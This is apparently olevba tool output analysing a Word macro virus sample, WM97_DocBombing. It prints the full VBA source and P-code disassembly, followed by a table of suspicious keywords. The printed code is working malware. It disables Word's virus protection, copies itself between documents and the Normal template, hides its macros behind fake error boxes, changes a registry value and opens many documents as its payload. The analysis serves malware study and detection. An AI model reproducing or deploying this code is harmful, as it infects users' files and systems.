olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Db
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO WM97_DocBombing.cls 
in file: ./Virus.MSWord.Db - OLE stream: 'Macros/VBA/WM97_DocBombing'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Dim ToInfectNT As Boolean, ToInfectAD As Boolean
Dim Bcl As Integer, NTCL As Integer, ADCL As Integer

Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NT.CodeModule.CountOfLines
ADCL = AD.CodeModule.CountOfLines

Options.SaveNormalPrompt = False
Options.VirusProtection = False

If (NT.Name) <> "WM97_DocBombing" Then
    NT.CodeModule.DeleteLines 1, NTCL
    ToInfectNT = True
    NT.Name = "WM97_DocBombing"
End If

If (AD.Name) <> "WM97_DocBombing" Then
    AD.CodeModule.DeleteLines 1, ADCL
    ToInfectAD = True
    AD.Name = "WM97_DocBombing"
End If

If (ToInfectNT = True And ToInfectAD = False) Then
    NT.CodeModule.InsertLines 1, "Private Sub Document_Close()"
    For Bcl = 2 To ADCL
        NT.CodeModule.InsertLines Bcl, AD.CodeModule.Lines(Bcl, 1)
    Next Bcl
    NT.CodeModule.InsertLines Bcl + 1, "Public Sub ViewVBCode()"
    NT.CodeModule.InsertLines Bcl + 2, "MsgBox " + """" + "This program has performed an illegal operation and will shut down." + """" + ", vbCritical, " + """" + "Microsoft Visual Basic" + """"
    NT.CodeModule.InsertLines Bcl + 3, "End Sub"
    
    NT.CodeModule.InsertLines Bcl + 4, "Public Sub ToolsMacro()"
    NT.CodeModule.InsertLines Bcl + 5, "MsgBox " + """" + "This program has performed an illegal operation and will shut down." + """" + ", vbCritical, " + """" + "Microsoft Word" + """"
    NT.CodeModule.InsertLines Bcl + 6, "End Sub"
End If

If (ToInfectNT = False And ToInfectAD = True) Then
    AD.CodeModule.InsertLines 1, "Private Sub Document_Open()"
    For Bcl = 2 To NTCL - 6
        AD.CodeModule.InsertLines Bcl, NT.CodeModule.Lines(Bcl, 1)
    Next Bcl
End If


If (Day(Now()) >= 6) Then
    If (Month(Now()) >= 11) Then
        If (Year(Now()) >= 2000) Then
            ActiveDocument.Windows.Application.Caption = "WM97_DocBombing virii !!"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Vortex!!"
            With ActiveDocument.Comments(1)
                .Author = "WM97_DocBombing"
                .Initial = "WM97_DB"
            End With
            For Bcl = 0 To 20
                Documents.Add
            Next Bcl
        End If
    End If
End If

'*** WM97_DocBombing Macro Virus ver1.2.03 by Vortex***
'Dedicasse au Condor (on est tous avec toi, Kevin !!!)
'Remerciements egalement a Kwyjibo pour l'excellente macro 'Melissa'
'Enjoy !!
End Sub
Public Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Visual Basic"
End Sub
Public Sub ToolsMacro()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Db
' ===============================================================================
' Module streams:
' Macros/VBA/WM97_DocBombing - 9164 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn ToInfectNT (As Boolean)
' 	VarDefn ToInfectAD (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn Bcl (As Integer)
' 	VarDefn NTCL (As Integer)
' 	VarDefn ADCL (As Integer)
' Line #4:
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #7:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #8:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' Line #13:
' 	Ld NT 
' 	MemLd New 
' 	Paren 
' 	LitStr 0x000F "WM97_DocBombing"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	LitVarSpecial (True)
' 	St ToInfectNT 
' Line #16:
' 	LitStr 0x000F "WM97_DocBombing"
' 	Ld NT 
' 	MemSt New 
' Line #17:
' 	EndIfBlock 
' Line #18:
' Line #19:
' 	Ld AD 
' 	MemLd New 
' 	Paren 
' 	LitStr 0x000F "WM97_DocBombing"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitVarSpecial (True)
' 	St ToInfectAD 
' Line #22:
' 	LitStr 0x000F "WM97_DocBombing"
' 	Ld AD 
' 	MemSt New 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	Ld ToInfectNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ToInfectAD 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ADCL 
' 	For 
' Line #28:
' 	Ld Bcl 
' 	Ld Bcl 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld Bcl 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0017 "Public Sub ViewVBCode()"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	Ld Bcl 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0007 "MsgBox "
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x000E ", vbCritical, "
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld Bcl 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' Line #34:
' 	Ld Bcl 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0017 "Public Sub ToolsMacro()"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	Ld Bcl 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x0007 "MsgBox "
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x000E ", vbCritical, "
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #36:
' 	Ld Bcl 
' 	LitDI2 0x0006 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld ToInfectNT 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ToInfectAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NTCL 
' 	LitDI2 0x0006 
' 	Sub 
' 	For 
' Line #42:
' 	Ld Bcl 
' 	Ld Bcl 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' Line #47:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Ge 
' 	Paren 
' 	IfBlock 
' Line #48:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Ge 
' 	Paren 
' 	IfBlock 
' Line #49:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	Paren 
' 	IfBlock 
' Line #50:
' 	LitStr 0x0018 "WM97_DocBombing virii !!"
' 	Ld ActiveDocument 
' 	MemLd Windows 
' 	MemLd Application 
' 	MemSt Caption 
' Line #51:
' 	LitStr 0x0008 "Vortex!!"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #52:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Comments 0x0001 
' 	With 
' Line #53:
' 	LitStr 0x000F "WM97_DocBombing"
' 	MemStWith Author 
' Line #54:
' 	LitStr 0x0007 "WM97_DB"
' 	MemStWith Initial 
' Line #55:
' 	EndWith 
' Line #56:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	For 
' Line #57:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #58:
' 	StartForVariable 
' 	Ld Bcl 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	QuoteRem 0x0000 0x0036 "*** WM97_DocBombing Macro Virus ver1.2.03 by Vortex***"
' Line #64:
' 	QuoteRem 0x0000 0x0035 "Dedicasse au Condor (on est tous avec toi, Kevin !!!)"
' Line #65:
' 	QuoteRem 0x0000 0x0043 "Remerciements egalement a Kwyjibo pour l'excellente macro 'Melissa'"
' Line #66:
' 	QuoteRem 0x0000 0x0008 "Enjoy !!"
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Public Sub ViewVBCode())
' Line #69:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	ArgsCall MsgBox 0x0003 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #72:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #73:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

